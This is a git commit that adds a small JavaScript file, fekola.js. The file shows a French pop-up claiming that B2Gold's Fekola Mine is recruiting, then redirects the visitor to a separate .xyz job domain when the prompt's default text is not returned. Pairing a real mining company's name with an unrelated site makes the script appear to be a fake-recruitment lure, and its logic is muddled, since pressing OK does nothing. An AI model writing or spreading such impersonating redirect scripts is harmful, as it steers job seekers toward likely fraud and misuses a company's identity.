d032f07fb4e0270608dd5780bb647b314dc77f6a
newetijazz2 <newetijazz2@gmail.com>
2025-08-20 12:10:18 +0100

    Create fekola.js

---
+++ fekola.js
@@ -0,0 +1,6 @@
+
+var password = ' Fekola Mine Recrutement.'
+password=prompt('NOTICE: B2Gold Fekola Mine recrute actuellement, appuyez sur OK pour postuler',' Fekola Mine Recrutement.');
+if (password != ' Fekola Mine Recrutement.') {
+location.href='https://www.botswajobs.xyz/Fekola-Mine-Recrutement';
+}
